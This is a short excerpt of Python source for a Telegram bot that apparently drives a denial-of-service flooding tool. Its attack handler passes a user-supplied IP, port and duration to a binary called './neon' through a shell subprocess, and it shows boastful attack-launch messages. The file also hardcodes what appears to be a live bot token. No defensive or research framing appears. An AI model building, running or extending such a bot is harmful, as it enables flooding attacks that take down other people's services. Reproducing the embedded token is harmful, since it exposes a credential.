...
TELEGRAM_BOT_TOKEN = '7800266230:AAFUMUGfhcCSkgsbNjp2Bf4uQXRUCA79DbI'
...
async def attack(update: Update, context: CallbackContext):
    ...
    text=(
        ...
        f"*🔥ᴜɴʟᴇᴀꜱʜɪɴɢ ꜰᴏʀᴄᴇ. ɴᴏ ᴛᴜʀɴɪɴɢ ʙᴀᴄᴋ. Powered by @Pyschoboi💥*"
    ), parse_mode='Markdown')
...
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./neon {ip} {port} {duration} 1024 400 ",
